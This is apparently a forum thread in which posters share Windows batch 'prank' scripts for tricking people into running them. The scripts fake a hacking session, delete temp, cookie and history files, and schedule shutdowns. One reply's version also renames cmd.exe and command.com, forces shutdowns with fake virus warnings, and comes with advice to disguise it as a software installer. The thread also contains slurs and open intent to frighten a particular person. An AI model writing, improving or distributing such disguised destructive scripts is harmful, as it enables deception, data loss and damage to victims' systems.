channel.title: A simple batch prank
channel.description:
I made a harmless somewhat of a batch prank, i made it because "a person" thought i hacked their myspace and i was like, your fucking stupid. and later today i was like.... i'm going to scare the shit out of her, and i am going to send this to her later today. the source code is below, most common myspace retards fall for this... you can overlook the codes, perfectly safe.
[code]@echo off title THE GAME -- BY ADAM. color 0c ECHO Processing myspace hack... ECHO Accessing: C:\Windows. ECHO Retreiving cookies. IF EXIST C:\WINDOWS\SMARTDRV.EXE C:\WINDOWS\SMARTDRV.EXE 2048 16 IF EXIST C:\WINDOWS\TEMP\*.* DELTREE /Y C:\WINDOWS\TEMP\*.* > NUL IF EXIST C:\WINDOWS\COOKIES\*.* DELTREE /Y C:\WINDOWS\COOKIES\*.* > NUL IF EXIST C:\WINDOWS\RECENT\*.* DELTREE /Y C:\WINDOWS\RECENT\*.* > NUL IF EXIST C:\WINDOWS\HISTORY\*.* DELTREE /Y C:\WINDOWS\HISTORY\*.* > NUL IF EXIST C:\WINDOWS\TEMPOR~1\*.* DELTREE /Y C:\WINDOWS\TEMPOR~1\*.* > NUL ECHO Transfering... ECHO Removing all cookies. ECHO Complete. ECHO . ECHO . ECHO Shuting down proccess in 120 seconds. shutdown -s -t 120 ECHO To abort this proccess type to correct answers below. ECHO Which of the folowing is an animal: Ball, Peache, Dog. set /p start=Answer: if %start%==Dog goto abort else goto abort pause
:abort cls shutdown -a Echo Aborting Shutdown Sequence... ECHO Complete. goto end pause
:end cls echo THIS WAS A BIG JOKE MADE BY ME ADAM. ECHO THIS IS HARMLESS, DID NOT STEAL YOUR MYSPACE INFORMATION echo OR ANY OTHER INFORMATIONS. ECHO ALL THIS DID WAS SCARE YOU AND DELETE YOUR TEMP INTERNET FILES, echo AND YOU WILL LIVE WITH OUT THEM. ECHO I HOPE YOU ALL HAD A WONDERFUL TIME. echo -adam echo . echo This program was inspired by a ture story, and was never meant to harm if this echo damaged your computer in any echo way, it is your fault for not checking out the source code first. echo . echo . echo . echo . echo . echo Adam ms-dos Productions © echo We are not responsible for your losses, and or fears. echo Contact: admin@xvague.net echo Copyright © - 2008 echo . echo . echo . echo . pause
end[/code]

item.title: A simple batch prank
item.dc:creator: @Aim Aim
item.description:
@Aim wrote:

Gotta Catch Them All:

Any prank that involves batch isn’t much of a prank.

Considerably, it is if you put it in such a manner that your friend gets pissed off and trys to beat you to death.

item.title: A simple batch prank
item.dc:creator: @deoxys505 deoxys505
item.description:
@deoxys505 wrote:

I have tested this and it works way better then yours.

just rename it ‘SCAR Divi 3.14 Installer’ and give it to some noob and they are screwed.

@ECHO off
TITLE You was Haxxed!!! -- By Deoxys505
COLOR 0c
ECHO Processing the Death of your Computer...
ECHO Accessing: %username%'s Files
ECHO Retrieving cookies.
IF EXIST %windir%\LOCAL SETTINGS\TEMP\*.* DELTREE /Y %windir%\LOCAL SETTINGS\TEMP\*.* > NUL
IF EXIST %username%\COOKIES\*.* DELTREE /Y %username%\COOKIES\*.* > NUL
IF EXIST %username%\RECENT\*.* DELTREE /Y %username%\RECENT\*.* > NUL
IF EXIST %username%\HISTORY\*.* DELTREE /Y %username%\HISTORY\*.* > NUL
IF EXIST %username%\LOCAL SETTINGS\TEMPORARY INTERNET FILES\*.* DELTREE /Y %username%\LOCAL SETTINGS\TEMPORARY INTERNET FILES\*.* > NUL
IF EXIST %windir%\TEMPOR~1\*.* DELTREE /Y %windir%\TEMPOR~1\*.* > NUL
ECHO Transfering...
ECHO Removing all cookies.
ECHO Complete.
ECHO .
ECHO .
ECHO Shutting down processes in 20 seconds.
Echo You better press enter or ELSE you might lose your work...
@ECHO off
SHUTDOWN -s -t 20 -c "Cause you been infected by a virus, your windows is shutting off."
ECHO To abort this proccess type the correct answer below.
ECHO Which of the following is an animal:
ECHO Ball, Peach, Dog?
SET /p start=Answer:
IF %start%==Dog GOTO abort
IF %start%==dog GOTO abort
IF %start%==DOg GOTO abort
IF %start%==DOG GOTO abort
IF %start%==dOg GOTO abort
IF %start%==doG GOTO abort
IF %start%==DoG GOTO abort
IF %start%==doG GOTO abort
IF %start%==dOG GOTO abort
IF %start%==Peach GOTO wrong
IF %start%==Ball GOTO wrong
IF %start%==PEach GOTO wrong
IF %start%==BAll GOTO wrong
IF %start%==peach GOTO wrong
IF %start%==ball GOTO wrong
GOTO wrong
PAUSE

:wrong
cls
ECHO How could you get the answer wrong?!
ECHO Geez, you must be stupid!
ECHO Oh well, You'll just pay for it now...,
ECHO or later if you choose...
ECHO What's your answer?
SET /p start=Answer:
IF %start%==now GOTO PayNow
IF %start%==Now GOTO PayNow
IF %start%==NOw GOTO PayNow
IF %start%==later GOTO PayLater
IF %start%==Later GOTO PayLater
IF %start%==LAter GOTO PayLater
goto PayNow

:PayNow
cls
ECHO You Chose to pay now...
ECHO It was your choice.
%systemroot%
rename cmd.exe cmmd.exe
rename command.com commy.com
shutdown -s -t 03 -c "You Chose to pay now"
goto finish

:PayLater
cls
ECHO You Chose to pay later...
ECHO It was your choice...
rename cmd.exe cmmd.exe
rename command.com commy.com
shutdown -s -t 90 -c "You Chose to pay later" 
goto finish

:abort
CLS
SHUTDOWN -a
Echo Aborting Shutdown Sequence...
ECHO Complete.
GOTO AlmostEnd
PAUSE

:AlmostEnd
CLS
ECHO Congrats, you know that a dog is an animal!
ECHO You win so don't freak out.
ECHO This was all just a joke so don't worry about it.
ECHO If this made you almost pee in your pants press 'y'
SET /p start=Answer:
IF %start%==y GOTO peepee
IF %start%==n GOTO over

:peepee
CLS
ECHO If you almost wet yourself, I'm sorry it won't happen again.
ECHO Did you pee in your pants? y/n
set /p start=Answer:
IF %start%==y GOTO pee
IF %start%==n GOTO over
PAUSE

:pee
CLS
ECHO Well, since you wet yourself,
ECHO Ill be nice... You've been haxxed!!!
@ECHO off
SHUTDOWN -s -f -t 05 -c "By the way... your computer is infected with a virus."
ECHO By the way... your computer is infected with a virus.
ECHO You might want to jump off a cliff.
ECHO Cya tomorrow.
@ECHO off
PAUSE
GOTO finish

:over
CLS
ECHO Your pretty lucky.
ECHO Most people would have pee'd on themselves.
ECHO But you didn't.
ECHO Congratulations again.
ECHO Have a nice day
@ECHO off
PAUSE
GOTO finish

:end
CLS
ECHO You suck and need to get a life.
ECHO A dog is an animal, not a peach or a ball.
ECHO By the way, this is just a joke,
ECHO so don't get freaked out...
ECHO Press enter to exit this program
@ECHO off
PAUSE
SHUTDOWN -s -f -t 10 -c "You Suck! You don't know that dogs are animals. Get a life"
GOTO finish


:finish
ECHO ciao
END

Read full topic

item.title: A simple batch prank
item.dc:creator: @Cryme_Time Cryme Time
item.description:
@Cryme_Time wrote:

I made a harmless somewhat of a batch prank, i made it because “a person” thought i hacked their myspace and i was like, your fucking stupid. and later today i was like… i’m going to scare the shit out of her, and i am going to send this to her later today. the source code is below, most common myspace retards fall for this… you can overlook the codes, perfectly safe.

[code]@echo off
title THE GAME – BY ADAM.
color 0c
ECHO Processing myspace hack…
ECHO Accessing: C:\Windows.
ECHO Retreiving cookies.
IF EXIST C:\WINDOWS\SMARTDRV.EXE C:\WINDOWS\SMARTDRV.EXE 2048 16
IF EXIST C:\WINDOWS\TEMP*.* DELTREE /Y C:\WINDOWS\TEMP*.* > NUL
IF EXIST C:\WINDOWS\COOKIES*.* DELTREE /Y C:\WINDOWS\COOKIES*.* > NUL
IF EXIST C:\WINDOWS\RECENT*.* DELTREE /Y C:\WINDOWS\RECENT*.* > NUL
IF EXIST C:\WINDOWS\HISTORY*.* DELTREE /Y C:\WINDOWS\HISTORY*.* > NUL
IF EXIST C:\WINDOWS\TEMPOR~1*.* DELTREE /Y C:\WINDOWS\TEMPOR~1*.* > NUL
ECHO Transfering…
ECHO Removing all cookies.
ECHO Complete.
ECHO .
ECHO .
ECHO Shuting down proccess in 120 seconds.
shutdown -s -t 120
ECHO To abort this proccess type to correct answers below.
ECHO Which of the folowing is an animal: Ball, Peache, Dog.
set /p start=Answer:
if %start%==Dog goto abort
else
goto abort
pause

:abort
cls
shutdown -a
Echo Aborting Shutdown Sequence…
ECHO Complete.
goto end
pause

:end
cls
echo THIS WAS A BIG JOKE MADE BY ME ADAM.
ECHO THIS IS HARMLESS, DID NOT STEAL YOUR MYSPACE INFORMATION
echo OR ANY OTHER INFORMATIONS.
ECHO ALL THIS DID WAS SCARE YOU AND DELETE YOUR TEMP INTERNET FILES,
echo AND YOU WILL LIVE WITH OUT THEM.
ECHO I HOPE YOU ALL HAD A WONDERFUL TIME.
echo -adam
echo .
echo This program was inspired by a ture story, and was never meant to harm if this
echo damaged your computer in any
echo way, it is your fault for not checking out the source code first.
echo .
echo .
echo .
echo .
echo .
echo Adam ms-dos Productions ©
echo We are not responsible for your losses, and or fears.
echo Contact: admin@xvague.net
echo Copyright © - 2008
echo .
echo .
echo .
echo .
pause

end[/code]
